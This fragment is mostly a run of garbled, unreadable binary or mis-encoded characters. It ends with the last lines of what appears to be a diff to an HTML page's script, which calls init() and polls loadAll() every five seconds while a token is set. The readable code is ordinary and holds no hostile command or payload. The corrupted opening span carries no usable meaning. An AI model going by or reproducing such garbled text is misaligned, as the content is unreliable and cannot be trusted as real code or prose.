�7B֗FV�G�G�W���V����W$�D���ƒ6�73�&&�G��5�G�U��"7G��S�&6���#�G�6ŷG�U�Ӷf��B�6��S����#������7�7G��S�&f��B�6��S�7��#�G��6w���7����F�7V�V�B�vWDV�V�V�D'��B�'F�7G2"��V�D6���B�V��6WEF��V�WB�����V��&V��fR���C���Р���������B���������B����6WD��FW'f������b�F��V���D�����S�����67&�C���&�G�����F���
+  /* ===== Init ===== */
+  init();
+  setInterval(() => { if(token) loadAll(); }, 5000);
+</script>
+</body>
+</html>
